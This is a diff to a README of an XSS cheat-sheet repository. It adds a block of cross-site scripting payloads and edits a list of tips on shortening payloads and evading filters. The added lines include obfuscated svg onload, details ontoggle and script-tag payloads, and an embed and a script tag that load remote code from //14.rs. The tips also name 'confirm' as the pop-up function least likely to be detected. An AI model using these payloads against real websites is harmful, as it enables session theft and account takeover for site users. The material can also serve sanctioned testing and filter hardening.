@@ -53,7 +53,15 @@ Put this repo on watch. I will be updating it regularly.
 ```
 
 ### Awesome Payloads
-Come back later
+```
+<svg%0Aonload=%09((pro\u006dpt))()//
+<sCript x>(((confirm)))``</scRipt x>
+<svg/x=">"/onload=confirm()//
+<embed src=//14.rs>
+<x oncut=alert()>x
+<details ontoggle=confirm()>
+<w="/x="y>"/ondblclick=`<`[confir\u006d``]>z
+```
 
 ### Awesome Exploits
 Come back later
@@ -114,14 +122,13 @@ If the your dummy tags lands in the source code as it is, go for any of these pa
 Come back later
 
 ### Awesome Tips & Tricks
-- http:// can be shortened to //
+- http(s):// can be shortened to // or /\.
 - **document.cookie** can be shortened to **cookie**. It applies to other DOM objects as well.
 - alert and other pop-up functions don't need a value, so stop doing **alert(1)** and start doing **alert()**
 - I have found that **confirm** is the least detected pop-up function so stop using **alert**.
 - Quotes around attribute value aren't neccessary. You can use **&lt;script src=//14.rs&gt;** instead of **&lt;script src="//14.rs"&glt;**
 - The shortest independent payload is **&lt;embed src=//14.rs&gt;** (19 chars)
 
-## Credits and all that
-Help me buy a new laptop:
+### Awesome Credits
 All the payloads are crafted by me unless specified.
 Thanks to my big brother [Rodolfo Assis](https://twitter.com/brutelogic) whose writings inspired me to become an XSSLord.
